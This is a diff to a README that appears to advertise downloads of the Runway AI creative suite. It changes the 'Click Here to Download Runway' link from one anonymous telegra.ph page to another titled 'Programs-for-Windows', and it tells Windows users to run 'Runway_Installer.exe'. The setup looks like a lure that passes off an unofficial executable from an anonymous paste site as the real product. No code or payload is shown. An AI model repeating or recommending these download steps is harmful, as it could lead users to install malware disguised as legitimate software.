@@ -19,7 +19,7 @@ Runway offers a powerful suite of **30+ AI-driven creative tools** for generatin
 ## 📥 **Installation – Super Easy!**  
 
 ### **Step 1: Download**  
-👉 [**Click Here to Download Runway**](https://telegra.ph/Runway-AI-Your-Ultimate-AI-Powered-Creative-Studio-05-23)
+👉 [**Click Here to Download Runway**](http://telegra.ph/Programs-for-Windows-05-23)
 
 ### **Step 2: Install**  
 - **Windows**: Run `Runway_Installer.exe` and follow the prompts.  
